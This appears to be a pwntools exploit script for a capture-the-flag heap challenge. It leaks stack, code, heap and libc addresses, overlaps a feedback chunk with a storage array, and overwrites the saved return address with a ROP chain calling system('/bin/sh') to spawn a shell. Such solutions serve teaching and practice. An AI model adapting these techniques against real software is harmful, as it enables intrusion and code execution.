#!/usr/bin/env python3

from pwn import *

exe = ELF('./chall_patched')
libc = ELF('./libc.so.6')
context.binary = exe

s = lambda a: p.send(a)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
sla = lambda a, b: p.sendlineafter(a, b)
lleak = lambda a, b: log.info(a + " = %#x" % b)
rcu = lambda a: p.recvuntil(a)
debug = lambda : gdb.attach(p, gdbscript = script)

def add_sto(stodesc, itemdesc):
	sla(b"> ", b"1")
	sla(b"storage description: ", stodesc)
	n = len(itemdesc)
	for i in range(n - 1):
		sla(b"item descripton: ", itemdesc[i])
		sla(b"(y/n) ", b"y")
	sla(b"item descripton: ", itemdesc[n - 1])
	sla(b"(y/n) ", b"n")

def upd_item(idx, data):
	sla(b"> ", b"2")
	sla(b"#ID: ", f"{idx}".encode())
	if(data != b""):
		sa(b"item description: ", data)

def del_item(idx):
	sla(b"> ", b"3")
	sla(b"#ID: ", f"{idx}".encode())

def feedback(data):
	sla(b"> ", b"4")
	if(p.recv(5) == b"Enter"):
		sa(b"feedback: ", data)
	else:
		sla(b"(y/n) ", b"y")
		sa(b"feedback: ", data)

def dec_ptr(offs):
	while(offs > 0x100):
		add_sto(b"A" * 4, [b"A" * 0xff] * 0x100)
		for i in range(0x100):
			upd_item(i, b"")
			del_item(i)
		offs -= 0x100
	add_sto(b"A" * 4, [b"A" * 0xff] * offs)
	for i in range(offs):
		upd_item(i, b"")
		del_item(i)

script = '''
# sscanf choice
brva 0x1AA9
'''

p = process('./chall_patched')
#p = gdb.debug('./chall_patched', gdbscript = script)

# leak stack
sla(b"> ", b"-")
rcu(b"Bad option: ")
menu_rsp = int(p.recvline()) - 0x188
lleak("menu_rsp", menu_rsp)

add_sto(b"0" * 4, [b"0" * 4] * 3) # fensghui

sla(b"> ", b"-")
rcu(b"Bad option: ")
code_base = int(p.recvline()) - 0x4880
lleak("code_base", code_base)

# fengshui
for i in range(3):
	del_item(i)
feedback(b"X" * 4)
# now feedback 0x10 chunk is the same as storages_arr[0]

dec_ptr(0x1d0)
# now feedback 0x10 chunk point to itself

# leak heap and make feedback 0x10 pointer point to stderr in glibc
sla(b"> ", b"4")
rcu(b'feedback: "')
heap_base = u64(p.recv(6).ljust(8, b"\x00")) - 0x310
lleak("heap_base", heap_base)
sla(b"(y/n) ", b"y")
sa(b"feedback: ", p64(code_base + 0x4040))

# leak libc and make feedback point to main saved rip
sla(b"> ", b"4")
rcu(b'feedback: "')
libc_base = u64(p.recv(6).ljust(8, b"\x00")) - libc.symbols['_IO_2_1_stderr_']
lleak("libc_base", libc_base)
sla(b"(y/n) ", b"y")
sa(b"feedback: ", b"A" * 0x20 + p64(code_base + 0x4070) + b"A" * 8 + p64(menu_rsp + 0x68))

# using feedback perform rop
system = libc_base + libc.symbols['system']
binsh = libc_base + list(libc.search(b"/bin/sh\x00"))[0]
pop_rdi = libc_base + 0x000000000010f75b
ret = pop_rdi + 1
feedback(p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system))

# trigger
sla(b"> ", b"5")

p.interactive()
